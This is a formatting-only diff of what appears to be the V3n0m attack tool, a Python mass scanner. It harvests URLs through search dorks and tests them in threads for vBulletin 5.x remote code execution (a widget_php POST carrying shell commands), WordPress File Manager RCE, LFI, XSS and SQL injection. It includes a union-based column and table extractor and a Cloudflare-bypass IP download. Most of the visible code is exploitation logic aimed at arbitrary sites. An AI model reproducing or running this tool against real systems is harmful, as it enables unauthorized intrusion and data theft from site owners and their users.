@@ -93,7 +93,6 @@ except Exception as verb:
         exit()
 __name__ = '__main__'
 
-
 def donations():
     import time
     print(B + "\n---------------------------------------------------------")
@@ -103,7 +102,6 @@ def donations():
     print(B + "----------------------------------------------------------")
     time.sleep(10)
     fmenu()
-
 
 def logo():
     cache_Check()
@@ -133,7 +131,6 @@ def logo():
     print(" Confirmed MISC Vulns In Database:" + O + "[", misc_count, "] " + R + "                        ")
     print("----------------------------------------------------------------\n")
 
-
 def vb5classic(url):
     url = url.rsplit(sites, 1)[0]
     url = url + sites
@@ -148,7 +145,6 @@ def vb5classic(url):
             misc_log_file.write("\n" + url + " vBulletin Ver 5.x > 5.5.4 RCE")
     except:
         pass
-
 
 class vb5thread(threading.Thread):
     def __init__(self, hosts):
@@ -171,7 +167,6 @@ class vb5thread(threading.Thread):
 
     def stop(self):
         self.check = False
-
 
 def vb5test():
     vb = len(usearch) / int(numthreads)
@@ -219,7 +214,6 @@ def classicwpfm(url):
             vuln.append(url)
             misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")
 
-
 class wpfmthread(threading.Thread):
     def __init__(self, hosts):
         self.hosts = hosts
@@ -241,7 +235,6 @@ class wpfmthread(threading.Thread):
 
     def stop(self):
         self.check = False
-
 
 def wpfmtest():
     vb = len(usearch) / int(numthreads)
@@ -266,7 +259,6 @@ def wpfmtest():
     except TimeoutError:
         pass
 
-
 def vb56(url, shell_cmd):
     try:
         post_data = {'subWidgets[0][template]': 'widget_php',
@@ -275,7 +267,6 @@ def vb56(url, shell_cmd):
     except:
         pass
     return r.text
-
 
 class vb56thread(threading.Thread):
     def __init__(self, hosts):
@@ -298,7 +289,6 @@ class vb56thread(threading.Thread):
 
     def stop(self):
         self.check = False
-
 
 def vb56test():
     log = "v3n0m-lfi.txt"
@@ -325,7 +315,6 @@ def vb56test():
     except TimeoutError:
         pass
 
-
 def classicvb56(url):
     url = url.rsplit(sites, 1)[0]
     url = url + sites
@@ -338,7 +327,6 @@ def classicvb56(url):
             misc_log_file.write("\n" + url + " vBulletin Ver 5.5.4 > 5.6.2 RCE")
     except:
         pass
-
 
 class Lfithread(threading.Thread):
     def __init__(self, hosts):
@@ -361,7 +349,6 @@ class Lfithread(threading.Thread):
 
     def stop(self):
         self.check = False
-
 
 def classiclfi(url):
     lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
@@ -396,7 +383,6 @@ def classiclfi(url):
     except:
         pass
 
-
 def lfitest():
     vb = len(usearch) / int(numthreads)
     i = int(vb)
@@ -420,10 +406,8 @@ def lfitest():
     except TimeoutError:
         pass
 
-
 def killpid():
     os.kill(os.getpid(), 9)
-
 
 class Injthread(threading.Thread):
     def __init__(self, hosts):
@@ -447,7 +431,6 @@ class Injthread(threading.Thread):
     def stop(self):
         self.check = False
 
-
 class xssthread(threading.Thread):
     def __init__(self, hosts):
         self.hosts = hosts
@@ -470,7 +453,6 @@ class xssthread(threading.Thread):
     def stop(self):
         self.check = False
 
-
 # noinspection PyBroadException
 def classicxss(url):
     xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
@@ -488,7 +470,6 @@ def classicxss(url):
             print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
             xss_log_file.write("\n" + url)
             vuln.append(url)
-
 
 # noinspection PyBroadException
 def xsstest():
@@ -510,7 +491,6 @@ def xsstest():
             threads.append(thread)
         for thread in threads:
             thread.join()
-
 
 # Apoligies for this ugly section of code
 # It is just a placeholder
@@ -670,14 +650,12 @@ def classicinj(url):
     except:
         pass
 
-
 # noinspection PyBroadException
 def life_pulse():
     global life
     pulse_1 = datetime.now()
     life = pulse_1 - pulse
     print(life)
-
 
 # noinspection PyBroadException
 def injtest():
@@ -710,7 +688,6 @@ def injtest():
                 thread.join()
     except TimeoutError:
         pass
-
 
 # noinspection PyBroadException
 def colfinder():
@@ -753,7 +730,6 @@ def colfinder():
                         site = site.replace("," + nullcol[0], ",darkc0de")
                         print("[+] darkc0de URL:", site)
                         darkurl.append(site)
-
                         print("[-] Done!\n")
                         break
             except:
@@ -807,8 +783,7 @@ def colfinder():
                             print("\n[+] Lets check for columns inside table < " + table + " >")
                             for column in columns:
                                 try:
-                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172",
-                                                                                         "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
+                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
                                     search = re.findall(str("NovaCygni"), source)
                                     if len(search) > 0:
                                         print("\t[!] Column found: < " + column + " >")
@@ -827,7 +802,6 @@ def colfinder():
                 break
             except(KeyboardInterrupt, SystemExit):
                 raise
-
 
 # noinspection PyBroadException,PyGlobalUndefined
 def fscan():
@@ -884,7 +858,6 @@ def fscan():
     usearch = loop.run_until_complete(search(pages_pulled_as_one))
     vulnscan()
 
-
 def cloud():
     import time
     logo()
@@ -906,18 +879,14 @@ def cloud():
     print("Cloud Resolving Finished")
     time.sleep(6)
 
-
 def det_Neph():
     print("")
-
 
 def det_Honeyd():
     print("")
 
-
 def det_Kippo():
     print("")
-
 
 # noinspection PyBroadException
 def vulnscan():
@@ -1063,7 +1032,6 @@ def vulnscan():
     else:
         fmenu()
 
-
 # noinspection PyBroadException
 def ignoringGet(url):
     header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
@@ -1081,13 +1049,11 @@ def ignoringGet(url):
     except Exception as verb:
         print(str(verb))
 
-
 def CreateTempFolder(self):
     from tempfile import mkdtemp
     self.temp = mkdtemp(prefix='v3n0m')
     if not self.temp.endswith(os.sep):
         self.temp += os.sep
-
 
 def progressBar(blocknum, blocksize, totalsize):
     readsofar = blocknum * blocksize
@@ -1099,17 +1065,14 @@ def progressBar(blocknum, blocksize, totalsize):
     if readsofar >= totalsize:  # near the end
         sys.stderr.write("\n")
 
-
 def download(url, file, progressBar=None):
     print('Downloading %s' % url)
     urllib.request.urlretrieve(url, file, progressBar)
-
 
 def unzip(file):
     with zipfile.ZipFile(file + '', 'w') as myzip:
         myzip.write(file)
     os.remove(file + '')
-
 
 downloads = [
     ['https://www.cloudflare.com/ips-v4', 'ips-v4', progressBar],
@@ -1117,7 +1080,6 @@ downloads = [
     ['http://crimeflare.net:82/domains/ipout.zip', 'ipout.zip',
      progressBar]
 ]
-
 
 # noinspection PyBroadException
 async def search(pages_pulled_as_one):
@@ -1181,6 +1143,7 @@ async def search(pages_pulled_as_one):
                     page = int(pages_pulled_as_one)
                 urls_len_last = urls_len
     tmplist = []
+
     print("\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ", len(urls))
     for url in urls:
         unsorted.append(url)
@@ -1188,8 +1151,7 @@ async def search(pages_pulled_as_one):
             host = url.split("/", 3)
             domain = host[2]
             for site in sitearray:
-                if domain not in tmplist and "=" in url and any(x in url for x in
-                                                                sitearray):
+                if domain not in tmplist and "=" in url and any(x in url for x in sitearray):
                     finallist.append(url)
                     tmplist.append(domain)
         except KeyboardInterrupt:
@@ -1211,7 +1173,6 @@ async def search(pages_pulled_as_one):
             continue
     print("[+] URLS (sorted)  : Trash, Duplicates, Dead-Links and other rubbish removed ", len(finallist))
     return finallist
-
 
 # noinspection PyBroadException
 def fmenu():
@@ -1288,7 +1249,6 @@ def fmenu():
         xss = subprocess.Popen("python V3n0mWrapper.py", shell=True)
         xss.communicate()
 
-
     elif chce == '8':
         print(W + "")
         os.system('clear')
@@ -1342,7 +1302,6 @@ def fmenu():
                 for i in range(threadcount):
                     executor.submit(xss_url)
 
-
         elif chce2 == '3':
             def lfi_url():
                 try:
@@ -1381,7 +1340,6 @@ def fmenu():
                 for i in range(threadcount):
                     executor.submit(vb5_url)
 
-
         elif chce2 == '5':
             def vb56_url():
                 for url in vb56list:
@@ -1399,8 +1357,6 @@ def fmenu():
             with concurrent.futures.ThreadPoolExecutor() as executor:
                 for i in range(threadcount):
                     executor.submit(vb56_url)
-
-
 
         elif chce2 == '6':
             def wpfm_url():
@@ -1559,14 +1515,12 @@ def enable_proxy():
     except Exception:
         pass
 
-
 # Colours
 W = "\033[0m"
 R = "\033[31m"
 G = "\033[32m"
 O = "\033[33m"
 B = "\033[34m"
-
 
 def cache_Check():
     global cachestatus
@@ -1580,7 +1534,6 @@ def cache_Check():
     else:
         cachestatus = "Logs Cache is Empty "
 
-
 def sql_list_counter():
     global sql_count
     try:
@@ -1589,7 +1542,6 @@ def sql_list_counter():
         sql_count = (len(l))
     except FileNotFoundError:
         sql_count = 0
-
 
 def lfi_list_counter():
     global lfi_count
@@ -1600,7 +1552,6 @@ def lfi_list_counter():
     except FileNotFoundError:
         lfi_count = 0
 
-
 def xss_list_counter():
     global xss_count
     try:
@@ -1609,7 +1560,6 @@ def xss_list_counter():
         xss_count = (len(l))
     except FileNotFoundError:
         xss_count = 0
-
 
 def misc_list_counter():
     global misc_count
@@ -1620,7 +1570,6 @@ def misc_list_counter():
     except FileNotFoundError:
         misc_count = 0
 
-
 def rce_list_counter():
     global rce_count
     try:
@@ -1629,7 +1578,6 @@ def rce_list_counter():
         rce_count = (len(l))
     except FileNotFoundError:
         rce_count = 0
-
 
 list_count = 0
 lfi_count = 0
@@ -1645,7 +1593,3 @@ menu = True
 current_version = str("431  ")
 while True:
     fmenu()
-
-
-
-
